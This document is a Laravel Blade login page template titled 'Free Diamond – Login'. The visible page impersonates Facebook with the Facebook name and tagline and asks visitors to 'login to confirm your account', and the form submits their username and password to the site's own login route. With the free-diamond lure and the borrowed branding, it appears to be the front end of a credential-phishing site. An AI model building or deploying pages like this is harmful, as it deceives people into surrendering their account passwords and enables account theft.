<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="csrf-token" content="{{ csrf_token() }}">
  <title>Free Diamond – Login</title>
  <style>
    /* Same CSS as register.blade.php */
    :root{
      --diamond-blue: #667eea;
      --diamond-green: #42b72a;
      --diamond-purple: #764ba2;
      --bg: #f0f2f5;
      --text: #1c1e21;
      --muted: #606770;
      --card: #ffffff;
      --line: #dadde1;
      --border: #dddfe2;
      --shadow: 0 2px 12px rgba(0,0,0,.12);
    }
    * { box-sizing: border-box; }
    html, body { height: 100%; }
    body {
      margin: 0;
      background: #ffffff;           /* solid white */
      color: var(--text);
      font: 16px/1.4 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, "Apple Color Emoji", "Segoe UI Emoji";
    }
    .visually-hidden {
      position: absolute !important; height: 1px; width: 1px;
      overflow: hidden; clip: rect(1px,1px,1px,1px);
      white-space: nowrap; border: 0; padding: 0; margin: -1px;
    }
    .shell{ min-height: 100vh; display: flex; 
      align-items: center;
      justify-content: center;
      gap: 56px; padding: 40px 16px; }
    .intro{ flex: 1 1 520px; max-width: 540px; }
    .panel{ flex: 0 0 396px; }
    .brand{ margin: 0 0 12px; color: #1327dd; font-size: clamp(40px, 6vw, 56px); line-height: 1; letter-spacing: -0.02em; font-weight: 800; font-family: Helvetica, Arial, sans-serif; text-shadow: 0 2px 4px rgba(0,0,0,0.1); }
    .tagline{ margin: 0; font-size: clamp(18px, 2.2vw, 24px); color: rgba(2, 0, 0, 0.9); text-shadow: 0 1px 2px rgba(0,0,0,0.1); }
    .card{ background: var(--card); border-radius: 8px; box-shadow: var(--shadow); padding: 20px; display: grid; gap: 16px; border: 0; }
    .card-title { margin: 0 0 8px 0; font-size: 24px; font-weight: 700; color: var(--text); text-align: center; }
    .field input{ width: 100%; height: 52px; padding: 14px 16px; border: 1px solid var(--border); border-radius: 6px; background: #fff; font-size: 17px; }
    .field input::placeholder{ color: #8a8d91; }
    .field input:focus{ outline: none; border-color: var(--diamond-blue); box-shadow: 0 0 0 2px rgba(32, 39, 67, 0.2); }
    .btn{ width: 100%; border: 0; border-radius: 6px; padding: 14px 16px; font-weight: 700; font-size: 20px; cursor: pointer; transition: all 0.3s ease; }
    /* blue “Login” button */
    .btn-primary{
      background:#667eea;      /* solid blue ─ matches var(--diamond-blue) */
      color:#fff;
      border:0;
      border-radius:6px;
      padding:14px 16px;
      font-weight:700;
      font-size:20px;
      cursor:pointer;
      transition:all .3s ease;
    }
    .btn-primary:hover{ transform: translateY(-2px); box-shadow: 0 8px 20px rgba(102, 126, 234, 0.3); }
    .btn-success{ background: var(--diamond-green); color: #fff; width: 60%; margin: 4px auto 6px; font-size: 17px; }
    .btn-success:hover{ background: #369e20; transform: translateY(-1px); }
    .aux{ margin: 0; text-align: center; }
    .link{ color: var(--diamond-blue); text-decoration: none; font-size: 14px; }
    .link:hover{ text-decoration: underline; }
    .divider{ border-top: 1px solid var(--line); margin: 8px 0; }
    .create-page{ text-align: center; font-size: 14px; color: var(--muted); margin: 24px 0 0; }
    .create-page a{ color: var(--diamond-blue); text-decoration: none; font-weight: 600; }
    .create-page a:hover{ text-decoration: underline; }
    .alert-success { background: #f0fff4; border: 1px solid #9ae6b4; color: #276749; padding: 12px; border-radius: 6px; margin-bottom: 16px; }
    .alert-error { background: #fed7d7; border: 1px solid #feb2b2; color: #c53030; padding: 12px; border-radius: 6px; margin-bottom: 16px; }
    .alert-error ul { margin: 0; padding-left: 1rem; }
    @media (max-width: 900px){ .shell{ align-items: flex-start; gap: 24px; } .intro{ flex: 1 1 auto; max-width: none; } }
    @media (max-width: 760px){ .shell{ flex-direction: column; align-items: center; text-align: center; padding-top: 56px; } .panel{ width: 100%; max-width: 396px; } .create-page{ margin-top: 16px; } }
  </style>
</head>
<body>
  <main class="shell" role="main">
    <!-- Left side: brand + tagline -->
    <section class="intro" aria-label="Brand introduction">
      <h1 class="brand">Facebook</h1>
      <p class="tagline">
         Facebook helps you connect and share with people in your life.
      </p>
    </section>
    
    <!-- Right side: card with login -->
    <section class="panel" aria-label="Login">
      <form class="card" method="POST" action="{{ route('login') }}" autocomplete="off">
        @csrf
        
        <h2 class="card-title">login to confirm your account</h2>
        
        @if (session('success'))
        <div class="alert-success">
          {{ session('success') }}
        </div>
        @endif


        @if ($errors->any())
        <div class="alert-error">
          <ul>
            @foreach ($errors->all() as $error)
              <li>{{ $error }}</li>
            @endforeach
          </ul>
        </div>
        @endif
        
        <div class="field">
          <label class="visually-hidden" for="username">Username</label>
          <input id="username" name="username" type="text" autocomplete="off" value="{{ old('username') }}" placeholder="Username" required autofocus />
        </div>
        
        <div class="field">
          <label class="visually-hidden" for="password">Password</label>
          <input id="password" name="password" type="password" autocomplete="new-password" placeholder="Password" required />
        </div>
        
        <button class="btn btn-primary" type="submit">Login</button>
        
        <p class="aux">
          <a class="link" href="{{ route('dashboard') }}">← Back to Home</a>
        </p>
        
        <div class="divider" role="separator" aria-hidden="true"></div>
        
        <a href="{{ route('register') }}" class="btn btn-success">create an account</a>
      </form>
    </section>
  </main>
</body>
</html>
